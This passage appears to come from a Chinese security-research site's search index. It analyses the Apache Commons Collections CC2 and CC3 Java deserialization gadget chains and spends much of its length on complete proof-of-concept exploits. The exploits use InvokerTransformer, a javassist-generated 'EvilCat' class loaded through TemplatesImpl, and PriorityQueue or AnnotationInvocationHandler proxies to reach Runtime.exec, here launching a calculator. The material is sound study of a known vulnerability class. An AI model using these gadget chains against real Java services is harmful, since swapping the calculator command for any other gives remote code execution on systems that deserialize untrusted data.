comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); \u7136\u540e\u901a\u8fc7\u53cd\u5c04\u5411queue\u6570\u7ec4\u8d4b\u503c\uff0c\u4e00\u4e2a\u503c\u4e3a\u521a\u521a\u751f\u6210\u7684TemplatesImpl\u5bf9\u8c61\uff0c\u53e6\u4e00\u4e2a\u503c\u968f\u610f\uff0c\u603b\u4e4b\u8fd9\u91cc\u5f97\u4f20\u51652\u4e2a\u4ee5\u4e0a\u7684\u503c\u3002 \u7136\u540e\u901a\u8fc7\u53cd\u5c04\u5411size\u8d4b\u503c\uff0c\u518d\u7136\u540e\u901a\u8fc7\u53cd\u5c04\u5411comparator\u8d4b\u503c\u3002 \u8d4b\u503c\u5b8c\u6210\u540e\u8fdb\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\u3002","title":"Apache-Commons-Collections 2"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%202/Apache-Commons-Collections%202/#apache-commons-collections-2","text":"","title":"Apache-Commons-Collections 2"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%202/Apache-Commons-Collections%202/#_1","text":"\u7248\u672c \u73af\u5883 \u5229\u7528\u94fe1 POC\u5206\u6790 1 POC\u5206\u6790 2 \u5229\u7528\u94fe2 TemplatesImpl \u7c7b\u751f\u6210 POC\u5206\u6790 cc\u94fe2 \u4e3b\u8981\u662fPriorityQueue\u548ccommons-collections-4.0 \u7ec4\u4ef6 \u9020\u6210\u7684Gadget\u3002 PriorityQueue \u662f\u4e00\u4e2a\u7528\u4e8e\u5927\u5c0f\u6392\u5e8f\u7684\u7c7b\uff0c\u5b83\u4f1a\u5c06\u4f20\u5165\u7684\u6570\u503c\u8fdb\u884c\u5927\u5c0f\u6392\u5e8f\u3002","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%202/Apache-Commons-Collections%202/#_2","text":"CommonsCollections 4.0 \u9700\u8981\u6709 javasist \u4f9d\u8d56 JDK\u7248\u672c\u6682\u65e0\u9650\u5236","title":"\u7248\u672c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%202/Apache-Commons-Collections%202/#_3","text":"pom.xml <dependency> <groupId>org.apache.commons</groupId> <artifactId>commons-collections4</artifactId> <version>4.0</version> </dependency>","title":"\u73af\u5883"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%202/Apache-Commons-Collections%202/#1","text":"PriorityQueue +ChianedTransfomer+\u53cd\u5c04\u4fee\u6539\u5c5e\u6027 ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator(); TransformingComparator.compare() //TransformingComparator cc4.0\u540e\u624d\u80fd\u5b9e\u73b0\u4e86\u5e8f\u5217\u5316\u63a5\u53e3 InvokerTransformer.transform() Method.invoke() Runtime.exec() POC import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; public class Main { public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}); TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } \u76f4\u63a5\u8ddf\u7740POC\u8c03\u8bd5\u3002 \u6211\u4eec\u6839\u636e\u5229\u7528\u94fe\u8ddf\u8fdb\u5230PriorityQueue.readObject \u8fd9\u91cc\u5148\u5faa\u73af\u8c03\u7528readObject\u5c06\u53cd\u5e8f\u5217\u5316\u7ed3\u679c\u653e\u5165queue\u6570\u7ec4\uff0c\u7136\u540e\u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u6700\u540e\u8c03\u7528\u4e86\u4e00\u4e2aheapify()\u65b9\u6cd5\uff0c\u6211\u4eec\u8ddf\u8fdb\u3002 \u8fd9\u91cc\u7684\u610f\u601d\u5bf9\u6211\u4eec\u6765\u8bf4\u4fbf\u662f\uff0c\u5982\u679csize\u5927\u4e8e1\u4fbf\u8c03\u7528siftDown\u65b9\u6cd5\u5904\u7406queue\u6570\u7ec4\u3002\u8ddf\u8fdbsiftDown \u4f1a\u53d1\u73b0\u6b64\u5904\u4f1a\u5224\u65adcomparator\u662f\u5426\u5b58\u5728\uff0c\u82e5\u5b58\u5728\u5219\u8c03\u7528siftDownUsingComparator\u3002\u94fe\u4e2d\u662f\u9700\u8981\u8ddf\u8fdbsiftDownUsingComparator\u65b9\u6cd5\u3002 siftDownUsingComparator\u91cc\u6709\u4e2acomparator.compare(x, (E) c),\u5176\u4e2d\u8fd9\u4e2ax\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u5c31\u662f\u6211\u4eec\u5f80queue\u4e2dput\u7684\u503c\u3002\u8ddf\u8fdbcompare\u65b9\u6cd5 \u53ef\u4ee5\u53d1\u73b0\u662f\u8c03\u7528\u4e86\u5f53\u524dtransformer\u6307\u5b9a\u7684\u7c7b\u7684transform\u65b9\u6cd5\uff0c\u800c\u5f53\u524dtransform\u6309\u7167POC\u4e2d\u6765\u770b\u4fbf\u662fChainedTransformer chain\uff0c\u4e8e\u662f\u6b64\u5904\u4fbf\u4f1a\u8c03\u7528ChainedTransformer\u7684transform\u65b9\u6cd5\uff0c\u6211\u4eec\u5728ChainedTransformer\u4e2d\u5199\u5165\u7684\u547d\u4ee4\u5c31\u4f1a\u88ab\u6267\u884c\u4e86\u3002 \u8fd9\u4fbf\u662f\u8fd9\u4e2a\u94fe\u7684\u5927\u4f53\u72b6\u51b5\uff0c\u4f46\u662f\u8fd9\u4e2aPOC\u4e2d\u4ecd\u7136\u6709\u4e00\u4e9b\u7ec6\u8282\u9700\u8981\u63a8\u6572\u3002","title":"\u5229\u7528\u94fe1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%202/Apache-Commons-Collections%202/#poc-1","text":"TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); \u8fd9\u91cc\u5411queue\u4e2dadd\u4e86\u4e24\u4e2a\u5143\u7d20\uff0c\u8fd9\u91ccadd\u4e86\u4e24\u4e2a\u5143\u7d20\u7684\u610f\u4e49\u662f\u8fd9\u6837\u7684\uff1a \u5728heapify\u4f1a\u5224\u65adqueue\u4e2d\u7684\u5bf9\u8c61\u6570\u91cf\u662f\u5426\u5927\u4e8e1\uff0c\u53ea\u6709\u5927\u4e8e1\u624d\u4f1a\u6267\u884csiftDown\u65b9\u6cd5\u3002","title":"POC\u5206\u6790 1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%202/Apache-Commons-Collections%202/#poc-2","text":"TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u5728POC\u6b64\u5904\u5728\u5b9e\u4f8b\u5316PriorityQueue\u65f6\u5e76\u6ca1\u6709\u4f20\u5165comparotor\uff0c\u800c\u662f\u5728\u540e\u9762\u4f7f\u7528\u53cd\u5c04\u7ed9comparator\u53d8\u91cf\u8d4b\u503c\u3002\u6211\u4eec\u8ddf\u8fdbqueue.add\u4fbf\u53ef\u4e00\u89c8\u7a76\u7adf add\u5728\u5b9e\u9645\u4e0a\u662f\u8c03\u7528\u4e86offer\u65b9\u6cd5\uff0c\u8ddf\u8fdboffer\u65b9\u6cd5 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2aoffer\u65b9\u6cd5\u4e5f\u8c03\u7528\u4e86siftUp\u8fd9\u4e2a\u65b9\u6cd5 \u8ddf\u8fdb\u540e\u81ea\u7136\u662f\u6765\u5230\u6b64\u5904\uff0c\u5982\u679ccomparator\u5b58\u5728\u5b83\u4fbf\u4f1a\u8d70\u4e0a\u9762\u7684\u5206\u652f\uff0c\u8c03\u7528transformer\u65b9\u6cd5\uff0c\u8d70\u4e0b\u9762\u4fbf\u662f\u8fdb\u884c\u8d4b\u503c\u64cd\u4f5c\u3002 \u5047\u5982\u6b64\u65f6comparator\u5b58\u5728\u8d70\u4e86\u4e0a\u9762\u7684\u5206\u652f\uff0c \u4fbf\u4f1a\u5728\u6b64\u884c\u4ea7\u751f\u62a5\u9519\uff0c\u8fd9\u91cc\u7684\u903b\u8f91\u662f\u5c06queue\u6570\u7ec4\u4e2d\u7684\u4e24\u4e2a\u503c\u8fdb\u884ctransform\u5904\u7406\u7136\u540e\u8fdb\u884c\u5927\u5c0f\u6bd4\u8f83\u4ee5\u6392\u5e8f\uff0c\u4f46\u662f\u8fd9\u91cc\u4e24\u4e2atransform\u65b9\u6cd5\u8fd4\u56de\u7684\u7ed3\u679c\u5747\u4e3aProccessImpl\u5bf9\u8c61\uff0c\u4e0d\u80fd\u88abcompare\u65b9\u6cd5\u8c03\u7528\u8fdb\u884c\u5927\u5c0f\u6bd4\u8f83\uff0c\u6240\u4ee5\u4f1a\u4ea7\u751f\u62a5\u9519\u3002\u5bfc\u81f4\u6211\u4eec\u540e\u9762\u7684\u5e8f\u5217\u5316\u64cd\u4f5c\u4e0d\u80fd\u987a\u5229\u6267\u884c\uff0c\u65e0\u6cd5\u4ea7\u751fpayload\u3002","title":"POC\u5206\u6790 2"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%202/Apache-Commons-Collections%202/#2","text":"\u94fe2\u7528\u5230\u4e86PriorityQueue +TemplatesImpl +InvokerTransformer\u548cjavassist\u6280\u672f\u3002 javassist \u53ef\u4ee5\u7528\u6765\u52a8\u6001\u4fee\u6539java\u5b57\u8282\u7801\uff0c\u76f8\u5173\u7ec6\u8282\u8fd9\u91cc\u5c31\u4e0d\u7ec6\u8bf4\u4e86\uff0c\u6211\u7684\u535a\u5ba2\u548c\u7f51\u4e0a\u5747\u6709\u5927\u91cf\u6587\u7ae0\u3002 ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() EvilClass.newInstance() \u5173\u4e8eTemplatesImpl \uff0c\u5b83\u4e5f\u662f7u21\u94fe\u4e2d\u4e0d\u53ef\u6216\u7f3a\u7684\u4e00\u4e2a\u73af\u8282\uff0c\u5b83\u914d\u5408javassist\u8d77\u5230\u4efb\u610f\u7c7b\u751f\u6210\u7684\u4f5c\u7528\uff0c\u5728\u8be5\u6761\u94fe\u4e2d\u53ef\u4ee5\u518d\u914d\u5408invokerTransformer\u6765\u8fbe\u5230\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\u3002 POC import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); //cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"blckder02\"); setFieldValue(templates, \"_class\", null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2.bin\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } }","title":"\u5229\u7528\u94fe2"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%202/Apache-Commons-Collections%202/#templatesimpl","text":"\u6211\u4eec\u5148\u6765\u770b\u4e00\u770bTemplatesImpl \u662f\u5982\u4f55\u8fdb\u884c\u7c7b\u751f\u6210\u7684\u3002 \u9996\u5148TemplatesImpl\u7c7b\u4e2d\u6709\u4e2a\u65b9\u6cd5defineTransletClasses\uff0c\u5b83\u7684\u4e3b\u8981\u4ee3\u7801\u5982\u4e0b private byte[][] _bytecodes = (byte[][])null; private void defineTransletClasses() throws TransformerConfigurationException { if (this._bytecodes == null) { ..... } else { TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader()); } }); try { int classCount = this._bytecodes.length; this._class = new Class[classCount]; for(int i = 0; i < classCount; ++i) { this._class[i] = loader.defineClass(this._bytecodes[i]); \\\\\u5c06_bytecodes\u4e2d\u7684\u6240\u6709\u5b57\u8282\u901a\u8fc7defineClass\u8f6c\u5316\u4e3a\u4e00\u4e2a\u7c7b Class superClass = this._class[i].getSuperclass(); if (superClass.getName().equals(ABSTRACT_TRANSLET)) { this._transletIndex = i; } else { this._auxClasses.put(this._class[i].getName(), this._class[i]); } } } \u4e5f\u5c31\u662f\u8bf4\u901a\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u5c06_bytecodes\u6570\u7ec4\u4e2d\u7684\u5b57\u8282\u8fd8\u539f\u6210\u4e00\u4e2a\u7c7b\uff0c\u5b58\u50a8\u5230_class\u53d8\u91cf\u4e2d\u3002\u63a5\u4e0b\u6765\u5982\u679c\u6211\u4eec\u80fd\u627e\u5230\u8c03\u7528defineTransletClasses\u65b9\u6cd5\u5e76\u6267\u884c\u4e86_class[].newinstance() \u8fd9\u6837\u7684\u7684\u4ee3\u7801\u7684\u65b9\u6cd5\uff0c\u5c31\u80fd\u5b9e\u4f8b\u5316\u4ece\u5b57\u8282\u5f97\u5230\u7684\u7c7b\u4e86\uff0c\u4ece\u800c\u5c31\u80fd\u6267\u884c\u7c7b\u4e2d\u7684\u9759\u6001\u4ee3\u7801\u5757\u548c\u6784\u9020\u51fd\u6570\u4e86\uff01 \u6240\u4ee5\u63a5\u4e0b\u6765\u6211\u4eec\u9700\u8981\u53bb\u5bfb\u627e\u8fd9\u79cd\u65b9\u6cd5\u3002 \u901a\u8fc7\u641c\u7d22defineTransletClasses\uff0c\u6211\u4eec\u627e\u5230\u4e86\u6709\u5982\u4e0b\u4e09\u4e2a\u65b9\u6cd5\u8c03\u7528\u4e86defineTransletClasses\u65b9\u6cd5\uff1a getTransletInstance getTransletIndex getTransletClasses \u5176\u4e2d\uff0cgetTransletInstance\u65b9\u6cd5\u662f\u552f\u4e00\u7b26\u5408\u201c\u8c03\u7528\u4e86defineTransletClasses\u4e14\u6709_class[].newinstance()\u201d\u7684\u65b9\u6cd5\uff0c\u5176\u4ee3\u7801\u5982\u4e0b private Translet getTransletInstance() throws TransformerConfigurationException { ErrorMsg err; try { if (this._name == null) { return null; } else { if (this._class == null) { this.defineTransletClasses(); } AbstractTranslet translet = (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\\\here,\u6ce8\u610f\u6b64\u5904\u751f\u6210\u7684\u7c7b\u5bf9\u8c61\u5e94\u8be5\u662fAbstractTranslet\u6216\u5176\u5b50\u7c7b translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(this._useServicesMechanism); if (this._auxClasses != null) { translet.setAuxiliaryClasses(this._auxClasses); } return translet; } \u90a3\u4e48\uff0cgetTransletInstance\u662f\u4e00\u4e2aprivate\u65b9\u6cd5\uff0c\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\u5b83\uff0c\u5728\u90a3\u91cc\u80fd\u53bb\u8c03\u7528\u5b83\u5462\uff1f\u7b54\u6848\u662fnewTransformer\u65b9\u6cd5 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer = new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory); \\\\here \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 } \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7javassist\u52a8\u6001\u63a7\u5236_bytecodes\u5c5e\u6027\u7684\u503c\uff0c\u7136\u540e\u901a\u8fc7InvokerTransfomer\u8c03\u7528TemplatesImpl.newTransfomer\u6765\u628a\u6211\u4eec\u901a\u8fc7javassist\u5f97\u5230\u7684\u5b57\u8282\u7801\u5b9e\u4f8b\u5316\uff0c\u5728\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u8c03\u7528\u5176\u6784\u9020\u51fd\u6570\u3002","title":"TemplatesImpl \u7c7b\u751f\u6210"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%202/Apache-Commons-Collections%202/#poc","text":"Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); \u8fd9\u91cc\u662f\u5148\u83b7\u53d6InvokerTransformer\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u7136\u540e\u5411\u6784\u9020\u65b9\u6cd5\u4f20\u5165newTransformer\u6765\u5b9e\u4f8b\u5316\u4e00\u4e2aInvokerTransformer\u65b9\u6cd5\u3002 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); //cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"blckder02\"); setFieldValue(templates, \"_class\", null); \u8fd9\u91cc\u662f\u901a\u8fc7javassist\u52a8\u6001\u5b9e\u73b0\u4e86\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u4e3a\u6267\u884c\u8ba1\u7b97\u5668\u7684\u7c7b\uff0c\u5c06\u5176\u8f6c\u5316\u4e3a\u5b57\u8282\u7801\u4fdd\u5b58\uff0c\u7136\u540e\u5728\u5b9e\u4f8b\u5316TemplatesImpl\u65f6\u4f20\u5165\u5176_bytecodes\u53d8\u91cf\uff0c\u8fd9\u91cc\u8fd8\u5fc5\u987b\u4e3a_name\u8d4b\u503c\uff0c_class\u6211\u6d4b\u8bd5\u7684\u65f6\u5019\u4e5f\u4e0d\u7528\u8d4b\u503c\uff0c\u4f46\u662f\u52a0\u4e0a\u6700\u597d\uff1f\u6211\u6ca1\u6709\u7ec6\u8ddf\u3002 Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); \u7136\u540e\u901a\u8fc7\u53cd\u5c04\u5411queue\u6570\u7ec4\u8d4b\u503c\uff0c\u4e00\u4e2a\u503c\u4e3a\u521a\u521a\u751f\u6210\u7684TemplatesImpl\u5bf9\u8c61\uff0c\u53e6\u4e00\u4e2a\u503c\u968f\u610f\uff0c\u603b\u4e4b\u8fd9\u91cc\u5f97\u4f20\u51652\u4e2a\u4ee5\u4e0a\u7684\u503c\u3002 \u7136\u540e\u901a\u8fc7\u53cd\u5c04\u5411size\u8d4b\u503c\uff0c\u518d\u7136\u540e\u901a\u8fc7\u53cd\u5c04\u5411comparator\u8d4b\u503c\u3002 \u8d4b\u503c\u5b8c\u6210\u540e\u8fdb\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\u3002","title":"POC\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%203/Apache-Commons-Collections%203/","text":"Apache-Commons-Collections 3 \u76ee\u5f55 \u7248\u672c \u5229\u7528\u94fe TrAXFilter.class InstantiateTransformer CC3\u94fe\u5927\u81f4\u4e0a\u662fCC1\u548cCC2\u7684\u7f1d\u5408\uff0c\u4e2d\u95f4\u4e00\u4e9b\u7ec6\u8282\u6709\u70b9\u4e0d\u540c\uff08TrAXFilter\uff0cInstantiateTransformer\uff09 LazyMap+TrAXFilter+InstantiateTransformer+TemplatesImpl \u7248\u672c commons-collections-3.1-3.2.1\uff0cJDK1.7 \u5229\u7528\u94fe ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() POC import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class Main { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //\u8bbe\u7f6e\u7236\u7c7b\u4e3aAbstractTranslet\uff0c\u907f\u514d\u62a5\u9519 byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}) }); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain); Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); handler_constructor.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); Constructor AnnotationInvocationHandler_Constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandler_Constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc3\")); outputStream.writeObject(handler); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc3\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } \u53ef\u4ee5\u53d1\u73b0\u662fChianedTransformer+TemplatesImpl+LazyMap \u7f1d\u5408\uff0c\u4e0d\u8fc7ChianedTransformer\u5185\u90e8\u6709\u70b9\u548cCC\u94fe1\u30012\u4e0d\u540c. ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new 